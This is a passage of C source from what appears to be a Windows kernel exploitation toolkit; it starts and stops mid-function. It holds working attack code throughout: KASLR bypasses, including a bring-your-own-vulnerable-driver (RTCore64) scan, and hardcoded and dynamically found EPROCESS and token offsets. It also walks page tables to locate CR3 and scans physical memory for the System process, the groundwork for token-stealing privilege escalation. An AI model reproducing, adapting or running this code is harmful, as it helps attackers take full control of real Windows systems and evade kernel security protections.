            DWORD64 base = LeakKernelBaseViaQuery(fnNtQuerySystemInformation, syscallEntry);
            if (base) {
                printf("[+] Kernel base via NtQuery:              0x%llx\n", base);
                fflush(stdout);
                return base;
            }
            printf("[*] NtQuery path failed\n"); fflush(stdout);
        }

        // 2. BYOVD IDT scan (RTCore64 / any driver with kernel R/W already init'd)
        if (hasBYOVD) {
            printf("[*] Attempting BYOVD VA scan (IDT-based)...\n"); fflush(stdout);
            DWORD64 base = LeakKernelBaseViaBYOVD();
            if (base) {
                printf("[+] Kernel base via BYOVD:                0x%llx\n", base);
                fflush(stdout);
                return base;
            }
            printf("[*] BYOVD scan failed\n"); fflush(stdout);
        }

        // 3. BigPool backward-scan (requires kernel R/W to walk back for MZ header)
        printf("[*] Attempting SystemBigPoolInformation + MZ scan fallback...\n");
        fflush(stdout);
        DWORD64 approxBase = LeakKernelBaseViaBigPool(fnNtQuerySystemInformation);
        if (approxBase) {
            printf("[+] Kernel base via BigPool scan:         0x%llx\n", approxBase);
            fflush(stdout);
        }

        // 4. Query CI flags (environmental probe — no base address possible)
        DWORD ciOpts = QueryAndPrintCodeIntegrityFlags(fnNtQuerySystemInformation);
        if (ciOpts & CI_OPTION_HVCI)
            printf("[!] HVCI is ENABLED — consider data-only techniques\n");

        return approxBase; // 0 if all methods failed
    }

    // ── Pre-24H2: SystemModuleInformation available without SeDebug ──
    printf("[*] Attempting NtQuerySystemInformation (SystemModuleInformation)...\n");
    fflush(stdout);
    DWORD64 base = LeakKernelBaseViaQuery(fnNtQuerySystemInformation, syscallEntry);
    if (base) {
        printf("[+] Kernel base via NtQuery:              0x%llx\n", base);
        fflush(stdout);
        return base;
    }

    // Fallback for pre-24H2 machines where NtQuery fails (rare, e.g. sandboxed)
    if (hasBYOVD) {
        printf("[*] NtQuery failed (non-admin?), attempting BYOVD VA scan...\n");
        fflush(stdout);
        DWORD64 byovdBase = LeakKernelBaseViaBYOVD();
        if (byovdBase) {
            printf("[+] Kernel base via BYOVD:                0x%llx\n", byovdBase);
            fflush(stdout);
            return byovdBase;
        }
    }

    printf("[-] All KASLR bypass methods failed\n"); fflush(stdout);
    return 0;
}

// Convenience wrapper for call-sites without BYOVD / without a SYSCALL_ENTRY.
// Equivalent to: SelectKASLRBypassMethod(fn, fnVer, FALSE, FALSE, NULL)
// Use this in exploits that only have fnNtQuerySystemInformation available
// (clfs, ktm, afd, acg data-only path, heap_to_kernel, etc.)
static DWORD64 SelectKASLRBypassMethodSimple(pNtQuerySystemInformation_t fnNtQuerySystemInformation,
                                              pRtlGetVersion_t fnRtlGetVersion) {
    return SelectKASLRBypassMethod(fnNtQuerySystemInformation, fnRtlGetVersion,
                                   FALSE, FALSE, NULL);
}

static void InitOffsets(KERNEL_OFFSETS* offsets, pRtlGetVersion_t fnRtlGetVersion) {
    if (!fnRtlGetVersion) return;

    RTL_OSVERSIONINFOW ver = {0};
    ver.dwOSVersionInfoSize = sizeof(ver);
    fnRtlGetVersion(&ver);

    printf("[*] Windows Build: %lu\n", ver.dwBuildNumber);

    if (ver.dwBuildNumber >= 26100) {
        offsets->EprocessUniqueProcessId     = 0x1D0;
        offsets->EprocessActiveProcessLinks  = 0x1D8;
        offsets->EprocessToken               = 0x248;
        offsets->EprocessImageFileName       = 0x338;
        offsets->TokenPrivileges             = 0x40;
        offsets->TokenUserAndGroups          = 0x98;
        offsets->TokenDefaultDacl            = 0xB8;
    } else if (ver.dwBuildNumber >= 22621) {
        offsets->EprocessUniqueProcessId = 0x440;
        offsets->EprocessActiveProcessLinks = 0x448;
        offsets->EprocessToken = 0x4B8;
        offsets->EprocessImageFileName = 0x5A8;
        offsets->TokenPrivileges = 0x40;
        offsets->TokenUserAndGroups = 0x98;
        offsets->TokenDefaultDacl = 0xB8;
    } else if (ver.dwBuildNumber >= 18362) {
        offsets->EprocessUniqueProcessId = 0x440;
        offsets->EprocessActiveProcessLinks = 0x448;
        offsets->EprocessToken = 0x4B8;
        offsets->TokenPrivileges = 0x40;
        offsets->TokenDefaultDacl = 0x88;
    } else {
        offsets->EprocessUniqueProcessId = 0x2E8;
        offsets->EprocessActiveProcessLinks = 0x2F0;
        offsets->EprocessToken = 0x358;
        offsets->EprocessImageFileName = 0x450;
        offsets->TokenPrivileges = 0x40;
        offsets->TokenDefaultDacl = 0x80;
    }

    offsets->EprocessDirectoryTableBase = 0x28;  // Constant across Win10/11
    offsets->KthreadPreviousMode = 0x232;
    offsets->DynamicallyResolved = FALSE;
}

static BOOL DynamicOffsetResolution(DWORD64 systemEPROCESS, KERNEL_OFFSETS* offsets) {
    if (!IsValidKernelAddress(systemEPROCESS)) return FALSE;

    BOOL foundPID = FALSE;

    printf("[*] Scanning EPROCESS at 0x%llx for UniqueProcessId (PID 4)...\n", systemEPROCESS); fflush(stdout);

    for (DWORD i = 0; i < 0x1000; i += 4) { // Scan every 4 bytes for more precision
        DWORD64 value = 0;
        if (!KernelRead64(systemEPROCESS + i, &value)) continue;

        if ((value & 0xFFFFFFFF) == 4 && (value >> 32) == 0) {
            for (DWORD checkIdx = 0; checkIdx < 0x240; checkIdx += 2) { // 2-byte steps for potential alignment shifts
                char name[8] = {0};
                DWORD64 nameVal = 0;
                KernelRead64(systemEPROCESS + i + checkIdx, &nameVal);
                if (memcmp(&nameVal, "System", 6) == 0) {
                    offsets->EprocessUniqueProcessId = i;
                    offsets->EprocessActiveProcessLinks = i + 8;
                    offsets->EprocessImageFileName = i + checkIdx;
                    foundPID = TRUE;
                    printf("[+] Found PID 4 at offset 0x%X (Verified via 'System' string at offset 0x%X)\n", i, offsets->EprocessImageFileName);
                    break;
                }
            }
            if (foundPID) break;
        }
    }

    if (!foundPID) return FALSE;

    DWORD candidateOffsets[10] = {0};
    int candidateCount = 0;

    for (DWORD i = 0x200; i < 0x600; i += 8) {
        DWORD64 value = 0;
        if (!KernelRead64(systemEPROCESS + i, &value)) continue;

        DWORD64 tokenPtr = value & 0xFFFFFFFFFFFFFFF0ULL;
        DWORD refCount = (DWORD)(value & 0xF);

        if (IsValidKernelAddress(tokenPtr) && tokenPtr != (DWORD64)-1 && refCount > 0 && candidateCount < 10) {
            candidateOffsets[candidateCount++] = i;
        }
    }

    if (candidateCount == 0) return FALSE;

    int bestScore = 0;
    DWORD bestOffset = candidateOffsets[0];

    for (int i = 0; i < candidateCount; i++) {
        int score = 0;
        DWORD64 tokenValue = 0;

        if (!KernelRead64(systemEPROCESS + candidateOffsets[i], &tokenValue)) continue;

        DWORD64 tokenPtr = tokenValue & 0xFFFFFFFFFFFFFFF0ULL;
        DWORD refCount = (DWORD)(tokenValue & 0xF);
        if (IsValidKernelAddress(tokenPtr)) score += 10;
        if (refCount > 0 && refCount < 16) score += 5;
        if ((tokenPtr & 0xFFFFF00000000000ULL) == 0xFFFFF00000000000ULL) score += 5;
        if (candidateOffsets[i] >= 0x200 && candidateOffsets[i] <= 0x600) score += 3;

        if (score > bestScore) {
            bestScore = score;
            bestOffset = candidateOffsets[i];
        }
    }

    offsets->EprocessToken = bestOffset;
    printf("[+] Found Token at offset 0x%X\n", bestOffset);

    DWORD64 systemTokenValue = 0;
    if (!KernelRead64(systemEPROCESS + offsets->EprocessToken, &systemTokenValue)) return FALSE;
    DWORD64 systemTokenAddr = systemTokenValue & 0xFFFFFFFFFFFFFFF0ULL;

    printf("[*] Scanning Token at 0x%llx for structure alignment...\n", systemTokenAddr);

    offsets->TokenPrivileges = 0x40;
    for (DWORD i = 0x40; i < 0x200; i += 8) {
        DWORD64 arrayPtr = 0;
        if (KernelRead64(systemTokenAddr + i, &arrayPtr) && IsValidKernelAddress(arrayPtr)) {
            DWORD64 sidPtr = 0;
            if (KernelRead64(arrayPtr, &sidPtr) && IsValidKernelAddress(sidPtr)) {
                DWORD64 sidData = 0;
                if (KernelRead64(sidPtr, &sidData)) {
                    // Check for S-1-5-18 signature
                    if ((sidData & 0xFFFFFFFFFFFFFFFFULL) == 0x0500000000000101ULL) {
                        offsets->TokenUserAndGroups = i;
                        printf("[+] Validated TokenUserAndGroups at offset 0x%X\n", i);
                        break;
                    }
                }
            }
        }
    }

    for (DWORD i = 0x60; i < 0x200; i += 8) {
        if (i == offsets->TokenUserAndGroups) continue;
        DWORD64 ptr = 0;
        if (KernelRead64(systemTokenAddr + i, &ptr) && IsValidKernelAddress(ptr)) {
            DWORD aclData = 0;
            if (KernelRead32(ptr, &aclData)) {
                if ((aclData & 0xFFFF) == 0x0002) {
                    offsets->TokenDefaultDacl = i;
                    printf("[+] Validated TokenDefaultDacl at offset 0x%X\n", i);
                    break;
                }
            }
        }
    }

    if (offsets->TokenUserAndGroups == 0) offsets->TokenUserAndGroups = 0x98;
    if (offsets->TokenDefaultDacl == 0) offsets->TokenDefaultDacl = 0xB8;

    printf("[+] Structure alignment validated: UserAndGroups(0x%X), DefaultDacl(0x%X)\n",
           offsets->TokenUserAndGroups, offsets->TokenDefaultDacl);

    offsets->DynamicallyResolved = TRUE;
    return TRUE;
}

static DWORD64 GetNtoskrnlBase() {
    LPVOID driverBaseAddresses[1024];
    DWORD sizeRequired;

    if (EnumDeviceDrivers(driverBaseAddresses, sizeof(driverBaseAddresses), &sizeRequired)) {
        if (sizeRequired > 0 && driverBaseAddresses[0] != NULL) {
            return (DWORD64)driverBaseAddresses[0];
        }
    }
    return 0;
}

static BOOL ValidatePageTableEntry(DWORD64 entry, DWORD64 maxPhys) {
    if (!(entry & 1)) return FALSE;
    DWORD64 physAddr = entry & 0xFFFFFFFFF000ULL;
    return (physAddr < maxPhys);
}

static DWORD64 FindCR3ViaPageWalk(BYTE* physMemMap, DWORD64 ntosVirtBase, DWORD64 ntosPhysBase, DWORD64 maxPhys) {
    DWORD64 searchEnd = GetCR3SearchEnd(maxPhys);

    printf("[*] FindCR3ViaPageWalk: Scanning for CR3 (Prioritizing 5-level LA57)...\n");

    for (DWORD64 testCr3 = CR3_SEARCH_START; testCr3 < searchEnd && testCr3 < maxPhys;
         testCr3 += CR3_SEARCH_ALIGNMENT) {

        __try {
            WORD pml5Index = (WORD)((ntosVirtBase >> 48) & 0x1FF);
            DWORD64 pml5eAddr = (testCr3 & 0xFFFFFFFFF000ULL) + (pml5Index * 8);
            if (pml5eAddr < maxPhys) {
                DWORD64 pml5e = *(DWORD64*)(physMemMap + pml5eAddr);
                if (pml5e & 1) {
                    DWORD64 pml4Base = pml5e & 0xFFFFFFFFF000ULL;
                    WORD pml4Index = (WORD)((ntosVirtBase >> 39) & 0x1FF);
                    DWORD64 pml4eAddr = pml4Base + (pml4Index * 8);
                    if (pml4eAddr < maxPhys) {
                        DWORD64 pml4e = *(DWORD64*)(physMemMap + pml4eAddr);
                        if (pml4e & 1) {
                            DWORD64 pdptBase = pml4e & 0xFFFFFFFFF000ULL;
                            WORD pdptIndex = (WORD)((ntosVirtBase >> 30) & 0x1FF);
                            DWORD64 pdpteAddr = pdptBase + (pdptIndex * 8);
                            if (pdpteAddr < maxPhys) {
                                DWORD64 pdpte = *(DWORD64*)(physMemMap + pdpteAddr);
                                if (pdpte & 1) {
                                    DWORD64 pdBase = pdpte & 0xFFFFFFFFF000ULL;
                                    WORD pdIndex = (WORD)((ntosVirtBase >> 21) & 0x1FF);
                                    DWORD64 pdeAddr = pdBase + (pdIndex * 8);
                                    if (pdeAddr < maxPhys) {
                                        DWORD64 pde = *(DWORD64*)(physMemMap + pdeAddr);
                                        if (pde & 1) {
                                            DWORD64 finalPhys = 0;
                                            if (pde & (1ULL << 7)) { // 2MB Page (Complex check)
                                                finalPhys = (pde & 0xFFFFFFFFE00000ULL) + (ntosVirtBase & 0x1FFFFFULL);
                                            } else {
                                                DWORD64 ptBase = pde & 0xFFFFFFFFF000ULL;
                                                WORD ptIndex = (WORD)((ntosVirtBase >> 12) & 0x1FF);
                                                DWORD64 pteAddr = ptBase + (ptIndex * 8);
                                                if (pteAddr < maxPhys) {
                                                    DWORD64 pte = *(DWORD64*)(physMemMap + pteAddr);
                                                    if (pte & 1) finalPhys = (pte & 0xFFFFFFFFF000ULL) + (ntosVirtBase & 0xFFFULL);
                                                }
                                            }
                                            if (finalPhys == ntosPhysBase) {
                                                printf("[+] FindCR3ViaPageWalk: Confirmed 5-level CR3: 0x%llx\n", testCr3);
                                                return testCr3;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    printf("[*] FindCR3ViaPageWalk: 5-level search failed, falling back to 4-level...\n");
    for (DWORD64 testCr3 = CR3_SEARCH_START; testCr3 < searchEnd && testCr3 < maxPhys;
         testCr3 += CR3_SEARCH_ALIGNMENT) {

        __try {
            WORD pml4Index = (WORD)((ntosVirtBase >> 39) & 0x1FF);
            DWORD64 pml4eAddr = (testCr3 & 0xFFFFFFFFF000ULL) + (pml4Index * 8);
            if (pml4eAddr < maxPhys) {
                DWORD64 pml4e = *(DWORD64*)(physMemMap + pml4eAddr);
                if (pml4e & 1) {
                    DWORD64 pdptBase = pml4e & 0xFFFFFFFFF000ULL;
                    WORD pdptIndex = (WORD)((ntosVirtBase >> 30) & 0x1FF);
                    DWORD64 pdpteAddr = pdptBase + (pdptIndex * 8);
                    if (pdpteAddr < maxPhys) {
                        DWORD64 pdpte = *(DWORD64*)(physMemMap + pdpteAddr);
                        if (pdpte & 1) {
                            DWORD64 finalPhys = 0;
                            if (pdpte & (1ULL << 7)) { // 1GB page
                                finalPhys = (pdpte & 0xFFFFC0000000ULL) + (ntosVirtBase & 0x3FFFFFFFULL);
                            } else {
                                DWORD64 pdBase = pdpte & 0xFFFFFFFFF000ULL;
                                WORD pdIndex = (WORD)((ntosVirtBase >> 21) & 0x1FF);
                                DWORD64 pdeAddr = pdBase + (pdIndex * 8);
                                if (pdeAddr < maxPhys) {
                                    DWORD64 pde = *(DWORD64*)(physMemMap + pdeAddr);
                                    if (pde & 1) {
                                        if (pde & (1ULL << 7)) { // 2MB page
                                            finalPhys = (pde & 0xFFFFFFFFE00000ULL) + (ntosVirtBase & 0x1FFFFFULL);
                                        }
                                    }
                                }
                            }
                            if (finalPhys == ntosPhysBase) {
                                printf("[+] FindCR3ViaPageWalk: Found 4-level CR3: 0x%llx\n", testCr3);
                                return testCr3;
                            }
                        }
                    }
                }
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    return 0;
}

static DWORD64 VirtualToPhysical(DWORD64 cr3, DWORD64 virtualAddr, BYTE* physMemMap, DWORD64 maxPhys) {
    if (cr3 == 0 || physMemMap == NULL || maxPhys == 0) return 0;

    __try {
        WORD pml5Index = (WORD)((virtualAddr >> 48) & 0x1FF);
        DWORD64 pml5eAddr = (cr3 & 0xFFFFFFFFF000ULL) + (pml5Index * 8);

        if (pml5eAddr < maxPhys) {
            DWORD64 pml5e = *(DWORD64*)(physMemMap + pml5eAddr);
            if (pml5e & 1) {
                DWORD64 pml4Base = pml5e & 0xFFFFFFFFF000ULL;
                WORD pml4Index = (WORD)((virtualAddr >> 39) & 0x1FF);
                DWORD64 pml4eAddr = pml4Base + (pml4Index * 8);

                if (pml4eAddr < maxPhys) {
                    DWORD64 pml4e = *(DWORD64*)(physMemMap + pml4eAddr);
                    if (pml4e & 1) {
                        DWORD64 pdptBase = pml4e & 0xFFFFFFFFF000ULL;
                        WORD pdptIndex = (WORD)((virtualAddr >> 30) & 0x1FF);
                        DWORD64 pdpteAddr = pdptBase + (pdptIndex * 8);

                        if (pdpteAddr < maxPhys) {
                            DWORD64 pdpte = *(DWORD64*)(physMemMap + pdpteAddr);
                            if (pdpte & 1) {
                                if (pdpte & (1ULL << 7)) return (pdpte & 0xFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFFULL);

                                DWORD64 pdBase = pdpte & 0xFFFFFFFFF000ULL;
                                WORD pdIndex = (WORD)((virtualAddr >> 21) & 0x1FF);
                                DWORD64 pdeAddr = pdBase + (pdIndex * 8);

                                if (pdeAddr < maxPhys) {
                                    DWORD64 pde = *(DWORD64*)(physMemMap + pdeAddr);
                                    if (pde & 1) {
                                        if (pde & (1ULL << 7)) return (pde & 0xFFFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFFULL);

                                        DWORD64 ptBase = pde & 0xFFFFFFFFF000ULL;
                                        WORD ptIndex = (WORD)((virtualAddr >> 12) & 0x1FF);
                                        DWORD64 pteAddr = ptBase + (ptIndex * 8);

                                        if (pteAddr < maxPhys) {
                                            DWORD64 pte = *(DWORD64*)(physMemMap + pteAddr);
                                            if (pte & 1) return (pte & 0xFFFFFFFFF000ULL) + (virtualAddr & 0xFFFULL);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        WORD pml4Index = (WORD)((virtualAddr >> 39) & 0x1FF);
        DWORD64 pml4eAddr = (cr3 & 0xFFFFFFFFF000ULL) + (pml4Index * 8);
        if (pml4eAddr < maxPhys) {
            DWORD64 pml4e = *(DWORD64*)(physMemMap + pml4eAddr);
            if (pml4e & 1) {
                DWORD64 pdptBase = pml4e & 0xFFFFFFFFF000ULL;
                WORD pdptIndex = (WORD)((virtualAddr >> 30) & 0x1FF);
                DWORD64 pdpteAddr = pdptBase + (pdptIndex * 8);
                if (pdpteAddr < maxPhys) {
                    DWORD64 pdpte = *(DWORD64*)(physMemMap + pdpteAddr);
                    if (pdpte & 1) {
                        if (pdpte & (1ULL << 7)) return (pdpte & 0xFFFFC0000000ULL) + (virtualAddr & 0x3FFFFFFFULL);
                        DWORD64 pdBase = pdpte & 0xFFFFFFFFF000ULL;
                        WORD pdIndex = (WORD)((virtualAddr >> 21) & 0x1FF);
                        DWORD64 pdeAddr = pdBase + (pdIndex * 8);
                        if (pdeAddr < maxPhys) {
                            DWORD64 pde = *(DWORD64*)(physMemMap + pdeAddr);
                            if (pde & 1) {
                                if (pde & (1ULL << 7)) return (pde & 0xFFFFFFFFE00000ULL) + (virtualAddr & 0x1FFFFFULL);
                                DWORD64 ptBase = pde & 0xFFFFFFFFF000ULL;
                                WORD ptIndex = (WORD)((virtualAddr >> 12) & 0x1FF);
                                DWORD64 pteAddr = ptBase + (ptIndex * 8);
                                if (pteAddr < maxPhys) {
                                    DWORD64 pte = *(DWORD64*)(physMemMap + pteAddr);
                                    if (pte & 1) return (pte & 0xFFFFFFFFF000ULL) + (virtualAddr & 0xFFFULL);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return 0; }
    return 0;
}

static BOOL ValidatePhysicalEPROCESS(BYTE* physMemMap, DWORD64 physOffset, DWORD64 maxPhys, KERNEL_OFFSETS* offsets) {
    __try {
        DWORD64 linksOffset = physOffset + offsets->EprocessActiveProcessLinks;
        if (linksOffset + sizeof(DWORD64) >= maxPhys) return FALSE;

        DWORD64 flink = *(DWORD64*)(physMemMap + linksOffset);
        if ((flink & KERNEL_POINTER_MASK) != KERNEL_POINTER_MASK) return FALSE;

        DWORD64 blink = *(DWORD64*)(physMemMap + linksOffset + sizeof(DWORD64));
        if ((blink & KERNEL_POINTER_MASK) != KERNEL_POINTER_MASK) return FALSE;

        DWORD64 tokenOffset = physOffset + offsets->EprocessToken;
        if (tokenOffset + sizeof(DWORD64) >= maxPhys) return FALSE;

        DWORD64 token = *(DWORD64*)(physMemMap + tokenOffset);
        if ((token & KERNEL_POINTER_MASK) != KERNEL_POINTER_MASK) return FALSE;

        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
}

// Find an EPROCESS via BigPool information
static DWORD64 FindProcessInBigPoolPhysical(BYTE* physMemMap, DWORD64 cr3, DWORD64 maxPhys, KERNEL_OFFSETS* offsets, pNtQuerySystemInformation_t fnNtQSI, DWORD targetPID) {
    if (!fnNtQSI) {
        printf("[-] FindProcessInBigPoolPhysical: fnNtQSI is NULL\n");
        return 0;
    }

    #ifndef SystemBigPoolInformation
    #define SystemBigPoolInformation 0x42
    #endif

    typedef struct _SYSTEM_BIGPOOL_ENTRY {
        union {
            PVOID VirtualAddress;
            ULONG_PTR NonPaged : 1;
        };
        SIZE_T SizeInBytes;
        union {
            UCHAR Tag[4];
            ULONG TagUlong;
        };
    } SYSTEM_BIGPOOL_ENTRY;

    typedef struct _SYSTEM_BIGPOOL_INFORMATION {
        ULONG Count;
        SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
    } SYSTEM_BIGPOOL_INFORMATION;

    ULONG bufferSize = 1024 * 1024;
    SYSTEM_BIGPOOL_INFORMATION* poolInfo = NULL;
    NTSTATUS status;
    int retries = 0;

    printf("[*] FindProcessInBigPoolPhysical: Querying SystemBigPoolInformation for PID %d...\n", targetPID);
    do {
        if (poolInfo) free(poolInfo);
        poolInfo = (SYSTEM_BIGPOOL_INFORMATION*)malloc(bufferSize);
        if (!poolInfo) return 0;

        SecureZeroMemory64(poolInfo, bufferSize);
        status = fnNtQSI(SystemBigPoolInformation, poolInfo, bufferSize, &bufferSize);

        if (status == 0xC0000004) {
            retries++;
            if (retries > 3) {
                printf("[-] FindProcessInBigPoolPhysical: Too many retries for SystemBigPoolInformation\n");
                free(poolInfo);
                return 0;
            }
            continue;
        }
        break;
    } while (TRUE);

    if (!NT_SUCCESS(status)) {
        printf("[-] FindProcessInBigPoolPhysical: NtQuerySystemInformation failed with status 0x%08X\n", status);
        if (poolInfo) free(poolInfo);
        return 0;
    }

    for (ULONG i = 0; i < poolInfo->Count; i++) {
        if (poolInfo->AllocatedInfo[i].TagUlong == 0x636F7250) {
            DWORD64 poolAddr = (DWORD64)poolInfo->AllocatedInfo[i].VirtualAddress & ~1ULL;
            if ((poolAddr & KERNEL_POINTER_MASK) != KERNEL_POINTER_MASK) continue;

            DWORD testOffsets[] = { 0x0, 0x10, 0x30, 0x3F, 0x40, 0x50, 0x60, 0x80 };

            for (int j = 0; j < sizeof(testOffsets)/sizeof(testOffsets[0]); j++) {
                DWORD64 eprocessAddr = poolAddr + testOffsets[j];
                DWORD64 physAddr = VirtualToPhysical(cr3, eprocessAddr, physMemMap, maxPhys);
                if (physAddr == 0 || physAddr >= maxPhys) continue;

                DWORD64 pidPhys = physAddr + offsets->EprocessUniqueProcessId;
                if (pidPhys + sizeof(DWORD) >= maxPhys) continue;

                __try {
                    DWORD pid = *(DWORD*)(physMemMap + pidPhys);
                    if (pid == targetPID) {
                        printf("[+] FindProcessInBigPoolPhysical: Found PID %d at EPROCESS 0x%llx (Physical 0x%llx) via offset 0x%X\n",
                               targetPID, eprocessAddr, physAddr, testOffsets[j]);
                        free(poolInfo);
                        return eprocessAddr;
                    }
                } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
            }
        }
    }

    printf("[-] FindProcessInBigPoolPhysical: Process PID %d not found in pool scan\n", targetPID);
    if (poolInfo) free(poolInfo);
    return 0;
}

static DWORD64 ScanPhysicalForEPROCESS(BYTE* physMemMap, DWORD64 maxPhys, DWORD targetPID, KERNEL_OFFSETS* offsets);

static DWORD64 FindSystemEPROCESSPhysical(BYTE* physMemMap, DWORD64 cr3, DWORD64 maxPhys, KERNEL_OFFSETS* offsets, pNtQuerySystemInformation_t fnNtQSI) {
    DWORD64 result = FindProcessInBigPoolPhysical(physMemMap, cr3, maxPhys, offsets, fnNtQSI, 4);
    if (result) return result;

    printf("[*] FindSystemEPROCESSPhysical: BigPool failed, scanning physical memory for PID 4...\n");
    DWORD64 physAddr = ScanPhysicalForEPROCESS(physMemMap, maxPhys, 4, offsets);
    if (physAddr) {
        printf("[+] FindSystemEPROCESSPhysical: Found System EPROCESS at physical 0x%llx\n", physAddr);
        DWORD64 flink = *(DWORD64*)(physMemMap + physAddr + offsets->EprocessActiveProcessLinks);
        if (IsValidKernelAddress(flink)) {
            DWORD64 blink = *(DWORD64*)(physMemMap + physAddr + offsets->EprocessActiveProcessLinks + 8);
            if (IsValidKernelAddress(blink)) {
                DWORD64 nextPhys = VirtualToPhysical(cr3, flink - offsets->EprocessActiveProcessLinks, physMemMap, maxPhys);
                if (nextPhys && nextPhys < maxPhys) {
                    DWORD64 nextBlink = *(DWORD64*)(physMemMap + nextPhys + offsets->EprocessActiveProcessLinks + 8);
                    if (IsValidKernelAddress(nextBlink)) {
                        DWORD64 systemVirtual = nextBlink - offsets->EprocessActiveProcessLinks;
                        printf("[+] FindSystemEPROCESSPhysical: System EPROCESS virtual = 0x%llx\n", systemVirtual);
                        return systemVirtual;
                    }
                }
            }
        }
    }

    return 0;
}

static DWORD64 FindProcessInListPhysical(BYTE* physMemMap, DWORD64 cr3, DWORD64 maxPhys, DWORD64 startEPROCESS, DWORD targetPID, KERNEL_OFFSETS* offsets) {
    DWORD64 currentEPROCESS = startEPROCESS;
    DWORD64 firstEPROCESS = startEPROCESS;
    int count = 0;

    printf("[*] FindProcessInListPhysical: Walking process list starting from 0x%llx (PID %d)...\n", startEPROCESS, targetPID);

    do {
        count++;
        if (count > 1000) {
            printf("[-] FindProcessInListPhysical: Exceeded max iterations (1000)\n");
            break;
        }

        DWORD64 currentPhys = VirtualToPhysical(cr3, currentEPROCESS, physMemMap, maxPhys);
        if (currentPhys == 0 || currentPhys >= maxPhys) {
            printf("[-] FindProcessInListPhysical: Failed to translate virtual address 0x%llx\n", currentEPROCESS);
            break;
        }

        __try {
            DWORD64 pidPhys = currentPhys + offsets->EprocessUniqueProcessId;
            if (pidPhys + sizeof(DWORD) >= maxPhys) break;

            DWORD pid = *(DWORD*)(physMemMap + pidPhys);

            if (pid == targetPID) {
                printf("[+] FindProcessInListPhysical: Found PID %d at EPROCESS 0x%llx\n", targetPID, currentEPROCESS);
                return currentEPROCESS;
            }

            DWORD64 flinkPhys = currentPhys + offsets->EprocessActiveProcessLinks;
            if (flinkPhys + sizeof(DWORD64) >= maxPhys) break;

            DWORD64 flink = *(DWORD64*)(physMemMap + flinkPhys);
            DWORD64 nextEPROCESS = flink - offsets->EprocessActiveProcessLinks;

            if (nextEPROCESS == firstEPROCESS) break;
            if ((nextEPROCESS & KERNEL_POINTER_MASK) != KERNEL_POINTER_MASK) break;

            currentEPROCESS = nextEPROCESS;
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            printf("[!] FindProcessInListPhysical: Exception during memory access at physical 0x%llx\n", currentPhys);
            break;
        }
    } while (TRUE);

    printf("[-] FindProcessInListPhysical: Process PID %d not found in list walk\n", targetPID);
    return 0;
}

static DWORD64 ScanPhysicalForEPROCESS(BYTE* physMemMap, DWORD64 maxPhys, DWORD targetPID, KERNEL_OFFSETS* offsets) {
    printf("[*] ScanPhysicalForEPROCESS: Scanning for PID %d...\n", targetPID);
    DWORD startTime = GetTickCount();

    printf("[*] Phase 1: Detecting kernel pool regions...\n");

    DWORD64 hotRegions[1024] = {0};
    DWORD64 warmRegions[2048] = {0};
    int hotCount = 0;
    int warmCount = 0;

    for (DWORD64 region = 0x40000000ULL; region < maxPhys && (hotCount < 1024 || warmCount < 2048); region += 0x100000ULL) {
        __try {
            int kernelPtrCount = 0;

            for (int i = 0; i < 64; i++) {
                DWORD64 sampleOffset = region + (i * 0x4000ULL);
                if (sampleOffset + 8 >= maxPhys) break;

                DWORD64 val = *(DWORD64*)(physMemMap + sampleOffset);
                if ((val >> 48) == 0xFFFF && val != 0xFFFFFFFFFFFFFFFFULL) {
                    kernelPtrCount++;
                }
            }

            if (kernelPtrCount >= 6 && hotCount < 1024) {
                hotRegions[hotCount++] = region;
            } else if (kernelPtrCount >= 2 && warmCount < 2048) {
                warmRegions[warmCount++] = region;
            }
        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
    }

    DWORD phase1Time = GetTickCount() - startTime;
    printf("[*] Found %d hot + %d warm regions in %u ms\n", hotCount, warmCount, phase1Time);

    DWORD64 checked = 0;
    DWORD64 pidMatches = 0;

    #define SCAN_REGION(regionStart, regionEnd) \
        for (DWORD64 offset = regionStart; offset < regionEnd - 0x600; offset += 0x40) { \
            __try { \
                DWORD64 flink = *(DWORD64*)(physMemMap + offset + offsets->EprocessActiveProcessLinks); \
                if ((flink >> 48) != 0xFFFF) continue; \
                if (flink == 0xFFFFFFFFFFFFFFFFULL) continue; \
                checked++; \
                DWORD pid = *(DWORD*)(physMemMap + offset + offsets->EprocessUniqueProcessId); \
                if (pid != targetPID) continue; \
                pidMatches++; \
                DWORD64 blink = *(DWORD64*)(physMemMap + offset + offsets->EprocessActiveProcessLinks + 8); \
                if ((blink >> 48) != 0xFFFF) continue; \
                DWORD64 token = *(DWORD64*)(physMemMap + offset + offsets->EprocessToken); \
                if ((token >> 48) != 0xFFFF) continue; \
                char imageFileName[16] = {0}; \
                memcpy(imageFileName, physMemMap + offset + offsets->EprocessImageFileName, 15); \
                if (targetPID == 4) { \
                    if (_strnicmp(imageFileName, "System", 6) != 0) continue; \
                } else { \
                    BOOL hasName = FALSE; \
                    for (int i = 0; i < 15 && imageFileName[i]; i++) { \
                        if ((imageFileName[i] >= 'A' && imageFileName[i] <= 'Z') || \
                            (imageFileName[i] >= 'a' && imageFileName[i] <= 'z') || \
                            (imageFileName[i] >= '0' && imageFileName[i] <= '9') || \
                            imageFileName[i] == '_' || imageFileName[i] == '.') { \
                            hasName = TRUE; \
                            break; \
                        } \
                    } \
                    if (!hasName) continue; \
                } \
                DWORD elapsed = GetTickCount() - startTime; \
                printf("[+] Found EPROCESS at physical 0x%llx in %u ms\n", offset, elapsed); \
                printf("    PID: %u, Name: %.15s\n", pid, imageFileName); \
                printf("    Checked %llu candidates, %llu PID matches\n", checked, pidMatches); \
                return offset; \
            } __except(EXCEPTION_EXECUTE_HANDLER) { continue; } \
        }

    printf("[*] Phase 2: Scanning %d hot regions...\n", hotCount);
    for (int h = 0; h < hotCount; h++) {
        DWORD64 regionStart = hotRegions[h];
